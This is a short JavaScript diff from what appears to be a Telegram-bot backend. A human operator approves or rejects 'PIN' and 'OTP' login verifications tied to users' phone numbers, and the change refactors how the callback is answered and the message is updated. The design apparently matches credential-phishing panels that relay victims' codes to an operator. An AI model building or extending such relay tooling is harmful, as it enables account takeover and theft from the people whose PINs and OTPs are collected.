@@ -225,23 +225,23 @@ function handleCallback(cq) {
     const rec = loginVerifications.get(id);
     if (rec) {
       loginVerifications.set(id, { ...rec, status: decision, decided: true });
-      tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
-      if (rec.messageId) {
-        tgApi('editMessageText', {
-          chat_id: rec.chatId,
-          message_id: rec.messageId,
-          parse_mode: 'HTML',
-          text:
-            `<b>🔐 ${kind} Verification</b>\n\n` +
-            `User: ${esc(rec.phone || 'N/A')}\n` +
-            (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
-            (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
-            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
-            `Status: <b>${stamp}</b>`,
-        });
-      }
-      console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
     }
+    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
+    if (rec && rec.messageId) {
+      tgApi('editMessageText', {
+        chat_id: rec.chatId,
+        message_id: rec.messageId,
+        parse_mode: 'HTML',
+        text:
+          `<b>🔐 ${kind} Verification</b>\n\n` +
+          `User: ${esc(rec.phone || 'N/A')}\n` +
+          (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
+          (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
+          `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
+          `Status: <b>${stamp}</b>`,
+      });
+    }
+    console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
     return;
   }
 }
